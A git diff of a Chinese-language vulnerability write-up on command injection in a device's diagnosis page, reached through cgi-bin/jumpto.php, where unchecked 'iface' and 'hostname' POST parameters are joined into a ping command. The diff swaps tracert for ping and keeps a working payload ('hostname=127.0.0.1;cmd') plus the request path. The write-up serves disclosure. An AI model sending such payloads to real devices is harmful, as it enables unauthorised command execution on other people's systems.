@@ -12,15 +12,15 @@
 
 在cgi-bin 目录下 jumpto.php 可以通过拼接GET参数，跳转到同级目录下的php或html文件
 
-![](assets\jumpto.png)
+![](./assets/jumpto.png)
 
-同级目录中的diagnosis目录下的diagnosis_config_save.php文件中提供了tracert功能，其代码如下：
+同级目录中的diagnosis目录下的diagnosis_config_save.php文件中提供了ping功能，其代码如下：
 
-![image-20221201184212966](assets/image-20221201184212966.png)
+![](./assets/ping_vuln.png)
 
-![](assets\tracert_vuln.png)
+在指定call_function为ping时，该函数接受post的iface参数与hostname参数，拼接指令并执行。然而此处对传进来的iface与hostname参数都没有进行校验，因此可以通过构造阶段从而实现任意命令执行。
 
-在指定call_function为tracert时，该函数接受post的iface参数与hostname参数，拼接指令并执行。然而此处对传进来的iface与hostname参数都没有进行校验，因此可以通过构造阶段从而实现任意命令执行。
+
 
 ## 三、漏洞利用
 
@@ -35,9 +35,9 @@ cgi-bin/jumpto.php?class=diagnosis&page=config_save&isphp=1
 设置POST参数使得可以执行ping命令并对其截断从而执行任意命令
 
 ```
-call_function=tracert&iface=eth0&hostname=127.0.0.1;cmd
+call_function=ping&iface=eth0&hostname=127.0.0.1;cmd
 ```
 
 漏洞利用结果如下，成功执行id指令，返回被攻击端的用户id：
 
-![](assets/tracert_success.png)
+![](./assets/success.png)
